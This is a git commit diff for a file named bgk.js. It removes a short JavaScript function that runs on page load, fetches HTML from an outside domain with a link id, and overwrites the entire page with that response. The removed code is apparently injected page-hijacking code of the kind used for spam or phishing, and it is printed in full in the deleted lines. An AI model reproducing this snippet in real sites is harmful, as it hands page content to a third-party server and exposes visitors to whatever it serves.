286e6cd9fe80b793f917fe3a508444688550d95f
ysvnmfaa39 <87510545+ysvnmfaa39@users.noreply.github.com>
2021-08-31 02:57:59 -0400

    Update bgk.js

--- bgk.js
+++ bgk.js
@@ -1,11 +1,1 @@
-function load_home () {
-    fetch("https://generatinog.info/?linkid=6465" /*, options */)
-    .then((response) => response.text())
-    .then((html) => {
-        document.querySelector("html").innerHTML = html;
-    })
-    .catch((error) => {
-        console.warn(error);
-    });
-}
-load_home();
+
